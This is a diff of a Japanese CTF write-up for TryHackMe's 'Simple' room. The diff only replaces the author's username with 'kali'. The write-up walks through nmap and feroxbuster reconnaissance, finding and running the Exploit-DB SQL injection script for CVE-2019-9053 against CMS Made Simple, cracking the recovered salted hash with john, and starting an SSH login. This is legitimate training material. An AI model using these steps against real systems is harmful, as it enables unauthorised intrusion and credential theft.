@@ -28,7 +28,7 @@
     
     <article class="writeup-body">
       <p>まずはオプションをつけずに<code>nmap</code>を実施する</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ nmap 10.49.136.159
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-13 15:26 +0900
 Nmap scan report for 10.49.136.159
@@ -42,7 +42,7 @@ PORT     STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 10.17 seconds
 </code></pre>
 <p>vulnスキャンをかけてみる</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ nmap 10.49.136.159 --script=vuln
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-13 15:27 +0900
 Nmap scan report for 10.49.136.159
@@ -54,12 +54,12 @@ PORT     STATE SERVICE
 
 Nmap done: 1 IP address (1 host up) scanned in 44.77 seconds
 
-┌──(rkametani㉿rkametani-1-kalija)-[~]
+┌──(kali㉿kali-1-kalija)-[~]
 └─$ 
 </code></pre>
 <p>なにも出なかった。既知の脆弱性がないことがわかった。</p>
 <p>つづいて<code>feroxbuster</code>を実施する</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ feroxbuster -u http://10.49.136.159
 
  ___  ___  __   __     __      __         __   ___
@@ -166,12 +166,12 @@ by Ben &quot;epi&quot; Risher 🤓                 ver: 2.13.1
 [####################] - 14s    30000/30000   2195/s  http://10.49.136.159/simple/admin/templates/ 
 [####################] - 1s     30000/30000   32086/s http://10.49.136.159/simple/admin/themes/ =&gt; Directory listing (add --scan-dir-listings to scan)
 [####################] - 13s    30000/30000   2307/s  http://10.49.136.159/simple/uploads/images/                                                                                                                                                                                                                       
-┌──(rkametani㉿rkametani-1-kalija)-[~]
+┌──(kali㉿kali-1-kalija)-[~]
 └─$ 
 </code></pre>
 <p><code>/simple</code>というディレクトリを発見</p>
 <p>また再度<code>--script=vuln</code>を実施したところ異なる結果が出た</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ nmap 10.49.136.159 --script=vuln
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-13 15:31 +0900
 Nmap scan report for 10.49.136.159
@@ -220,7 +220,7 @@ msf &gt;
 </code></pre>
 <p>metasploitでもmoduleを見つけたがdos攻撃してどうするねんという感じ</p>
 <p><code>-sC</code>オプションをつけてnmapしてみた</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ nmap 10.49.136.159 -sC
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-13 15:33 +0900
 Nmap scan report for 10.49.136.159
@@ -259,7 +259,7 @@ Nmap done: 1 IP address (1 host up) scanned in 42.17 seconds
 <p>・ftpはバージョン３を使っていて強そう<br>
 ・２２２２番でなぜかSSHが動いているけど謎</p>
 <p>feroxbusterで見つけた<code>/simple</code>のディレクトリを掘ってみる</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ whatweb http://10.49.136.159/simple
 http://10.49.136.159/simple [301 Moved Permanently] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.49.136.159], RedirectLocation[http://10.49.136.159/simple/], Title[301 Moved Permanently]
 http://10.49.136.159/simple/ [200 OK] Apache[2.4.18], CMS-Made-Simple[2.2.8], Cookies[CMSSESSIDd6a5f2400115], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.49.136.159], JQuery[1.11.1], MetaGenerator[CMS Made Simple - Copyright (C) 2004-2019. All rights reserved.], Script[text/javascript], Title[Home - Pentest it]
@@ -267,7 +267,7 @@ http://10.49.136.159/simple/ [200 OK] Apache[2.4.18], CMS-Made-Simple[2.2.8], Co
 </code></pre>
 <p>simpleというサービスのバージョンが<code>2.2.8</code>であることが分かった</p>
 <p><code>searchsploit</code>でkaliの中にエクスプロイトコードがないか調べる</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~]
 └─$ searchsploit Simple 2.2.8                      
 -------------------------------------------------------------------------------------------------------------------------- ---------------------------------
  Exploit Title                                                                                                            |  Path
@@ -278,7 +278,7 @@ Simple PHP Agenda 2.2.8 - Cross-Site Request Forgery (Add Admin / Add Event)    
 -------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 
-┌──(rkametani㉿rkametani-1-kalija)-[~]
+┌──(kali㉿kali-1-kalija)-[~]
 └─$ 
 </code></pre>
 <p>SQLiとCSRFのコードが見つかった</p>
@@ -286,7 +286,7 @@ Shellcodes: No Results
 <code>-sC</code>でデフォルトのサービス情報を読み込み<br>
 <code>-sV</code>で各ポートのサービスバージョンを調べ<br>
 <code>-oX output.xml</code>でXMLファイルに出力する</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/simple]
 └─$ nmap 10.49.142.133 -sC -sV -oX output.tml
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-14 08:09 +0900
 Nmap scan report for 10.49.142.133
@@ -326,7 +326,7 @@ Nmap done: 1 IP address (1 host up) scanned in 49.18 seconds
 
 </code></pre>
 <p><code>--nmap output.xml</code>でこれらのサービスに関わるエクスプロイトを検索する</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/simple]
 └─$ searchsploit --nmap output.xml 
 [i] SearchSploit's XML mode (without verbose enabled).   To enable: searchsploit -v --xml...
 [i] Reading: 'output.xml'
@@ -416,7 +416,7 @@ Shellcodes: No Results
 <p>simpleに関するエクスプロイトが取れなかった<br>
 nmapの出力結果にないので当たり前だ</p>
 <p>素直に<code>whatweb http://[ip address]/simple</code>の結果から探した</p>
-<pre><code class="language-bash">──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+<pre><code class="language-bash">──(kali㉿kali-1-kalija)-[~/tryhackme/simple]
 └─$ searchsploit CMS Made Simple 2.2.8
 ------------------------------------------- ---------------------------------
  Exploit Title                             |  Path
@@ -425,12 +425,12 @@ CMS Made Simple &lt; 2.2.10 - SQL Injection   | php/webapps/46635.py
 ------------------------------------------- ---------------------------------
 Shellcodes: No Results
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/simple]
 └─$ 
 
 </code></pre>
 <p>見つかったのでこれをカレントディレクトリに持ってきて実行する</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/simple]
 └─$ searchsploit -m 46635             
   Exploit: CMS Made Simple &lt; 2.2.10 - SQL Injection
       URL: https://www.exploit-db.com/exploits/46635
@@ -438,11 +438,11 @@ Shellcodes: No Results
     Codes: CVE-2019-9053
  Verified: False
 File Type: Python script, ASCII text executable
-Copied to: /home/rkametani/tryhackme/simple/46635.py
+Copied to: /home/kali/tryhackme/simple/46635.py
 
 
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/simple]
 └─$ ls
 46635.py  output.xml
 </code></pre>
@@ -455,14 +455,14 @@ parser.add_option('-c', '--crack', action=&quot;store_true&quot;, dest=&quot;cra
 </code></pre>
 <p>上記の3行が見つかった<br>
 <code>-c</code>がよく分からないのでいったん無視して<code>-u</code>と<code>-w</code>を指定してみる</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/simple]
 └─$ ./46635.py -u http://10.49.142.133/simple -w /usr/share/wordlists/rockyou.txt
-  File &quot;/home/rkametani/tryhackme/simple/./46635.py&quot;, line 25
+  File &quot;/home/kali/tryhackme/simple/./46635.py&quot;, line 25
     print &quot;[+] Specify an url target&quot;
     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 SyntaxError: Missing parentheses in call to 'print'. Did you mean print(...)?
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/simple]
 └─$ 
 </code></pre>
 <p>しかし構文エラーが出てしまった<br>
@@ -481,10 +481,10 @@ print(&quot;Hello world&quot;)   # python 3.x
 <hr>
 <p>とのこと。<br>
 vimでこの変更をしてみる。</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/simple]
 └─$ vim 46635.py
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/simple]
 └─$ cat 46635.py | grep print
 from termcolor import cprint
     print (&quot;[+] Specify an url target&quot;)
@@ -506,7 +506,7 @@ def beautify_print():
     print (colored(&quot;[*] Now try to crack password&quot;))
 beautify_print()
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/simple]
 └─$ 
 
 </code></pre>
@@ -517,7 +517,7 @@ beautify_print()
 [+] Email found: admin@admin.com
 [+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
 
-┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+┌──(kali㉿kali-1-kalija)-[~/tryhackme/simple]
 └─$ 
 </code></pre>
 <p>それらしき結果が出た<br>
@@ -528,7 +528,7 @@ beautify_print()
 <pre><code>echo &quot;0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2&quot; &gt; hash.txt
 </code></pre>
 <p>それを使ってhashcatする</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/simple]
 └─$ hashcat -m 20 hash.txt /usr/share/wordlists/rockyou.txt
 hashcat (v7.1.2) starting
 
@@ -540,11 +540,11 @@ Stopped: Thu May 14 09:23:52 2026
 <p>vm環境ではGPUが使えないのでエラーを吐く<br>
 john the ripperを使うことにする</p>
 <p><code>ユーザー：ハッシュ$ソルト</code>の形でjohn用のテキストファイルを作る</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/simple]
 └─$ echo &quot;mitch:0c01f4468bd75d7a84c7eb73846e8d96\$1dac0d92e9fa6bb2&quot; &gt; john_hash.txt
 </code></pre>
 <p>実行する</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/simple]
 └─$ john --format=dynamic_4 --wordlist=/usr/share/wordlists/rockyou.txt john_hash.txt
 Using default input encoding: UTF-8
 Loaded 1 password hash (dynamic_4 [md5($s.$p) (OSC) 512/512 AVX512BW 16x3])
@@ -558,7 +558,7 @@ Session completed.
 <p><code>secret</code>が出た<br>
 <code>dynamic_4</code> と明示することで、John the Ripper に対して「このハッシュは『パスワード＋ソルト』をMD5したものだから、そのルールで総当たりしてくれ」と指示していることになる。</p>
 <p>これを使ってsshログインを試みる</p>
-<pre><code class="language-bash">┌──(rkametani㉿rkametani-1-kalija)-[~/tryhackme/simple]
+<pre><code class="language-bash">┌──(kali㉿kali-1-kalija)-[~/tryhackme/simple]
 └─$ ssh mitch@10.49.142.133 -p 2222 
 The authenticity of host '[10.49.142.133]:2222 ([10.49.142.133]:2222)' can't be established.
 ED25519 key fingerprint is: SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g
